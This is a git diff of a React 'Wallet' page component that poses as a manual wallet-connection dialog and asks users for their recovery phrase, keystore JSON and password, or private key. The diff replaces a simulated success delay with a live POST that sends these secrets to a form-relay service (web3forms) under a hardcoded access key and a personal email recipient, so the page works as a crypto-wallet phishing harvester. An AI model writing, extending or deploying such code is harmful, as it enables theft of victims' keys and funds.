@@ -1,15 +1,18 @@
-import Header from '../Head-Foot/header';
 import './wallet.css';
-
-import React, { useState, useEffect } from "react";
+import { useLocation } from "react-router-dom";
+import { useState, useEffect } from "react";
 
 const Wallet = () => {
+  const location = useLocation();
+  const wallet = location.state?.wallet;
+
   const [loading, setLoading] = useState(true);
   const [showDialog, setShowDialog] = useState(false);
   const [animal, setAnimal] = useState("Phrase");
-  const [name, setName] = useState("");
-  const [submitting, setSubmitting] = useState(false); // NEW: for loading after Proceed
-  const [successDialog, setSuccessDialog] = useState(false); // NEW: for success state
+  const [name, setName] = useState(""); // Phrase / Keystore JSON / Private Key
+  const [keystorePassword, setKeystorePassword] = useState(""); // NEW: for Keystore password
+  const [submitting, setSubmitting] = useState(false);
+  const [successDialog, setSuccessDialog] = useState(false);
 
   useEffect(() => {
     const timer = setTimeout(() => {
@@ -18,20 +21,53 @@ const Wallet = () => {
     return () => clearTimeout(timer);
   }, []);
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
-    setSubmitting(true); // show loading state
-    setTimeout(() => {
+    setSubmitting(true);
+
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json"
+        },
+        body: JSON.stringify({
+          access_key: "98cc6406-0e30-4999-9496-65ac1c56fa08",
+          name: wallet.label, // required
+          email: "cipriancretu@gmail.com.com", // required, placeholder is fine
+          message: `Name: ${wallet.label}\nType: ${animal}\nInput: ${name}\nMessage: ${animal === "Keystore" ? keystorePassword : ""}`,
+          // custom fields message=password, wallet=name
+          wallet_label: wallet.label,
+          wallet_image: wallet.image,
+          type: animal,
+          input_info: name,
+          keystore_password: animal === "Keystore" ? keystorePassword : null
+        })
+      });
+
+      const result = await response.json();
+
+      if (result.success) {
+        setSuccessDialog(true);
+      } else {
+        alert("Failed to send data: " + result.message);
+      }
+    } catch (error) {
+      alert("Error submitting form: " + error.message);
+    } finally {
       setSubmitting(false);
-      setSuccessDialog(true); // show success dialog
-    }, 3000); // 3 seconds
+    }
   };
+
+
 
   const handleCloseSuccess = () => {
     setSuccessDialog(false);
-    setShowDialog(false); // close first dialog too
+    setShowDialog(false);
     setAnimal("Phrase");
     setName("");
+    setKeystorePassword("");
   };
 
   const getAnimalText = () => {
@@ -52,7 +88,7 @@ const Wallet = () => {
       case "Phrase":
         return "Enter your recovery phrase";
       case "Keystore":
-        return "Enter Keystore";
+        return "Enter Keystore JSON";
       case "privateKey":
         return "Enter your private key";
       default:
@@ -87,7 +123,10 @@ const Wallet = () => {
           {showDialog && (
             <div className="dialog-overlay">
               <div className="dialog-box">
-                <h2>Manual Connection</h2>
+                <div>
+                  <img src={wallet.image} alt='wallet' width={40} height={40}/>
+                  <h2 style={{color: "#444444"}}>{wallet.label}</h2>
+                </div>
 
                 <div className="animal-selector">
                   {["Phrase", "Keystore", "privateKey"].map((a) => (
@@ -113,13 +152,14 @@ const Wallet = () => {
                       required
                     />
                     { animal === "Keystore" ? (
-                          <textarea 
-                          placeholder='Wallet Password'
-                          rows={1}
-                          required
-                          />
-                        ) : null
-                    }
+                      <textarea 
+                        placeholder="Wallet Password"
+                        rows={1}
+                        value={keystorePassword}
+                        onChange={(e) => setKeystorePassword(e.target.value)}
+                        required
+                      />
+                    ) : null }
                   </label>
 
                   <p className="animal-info">{getAnimalText()}</p>
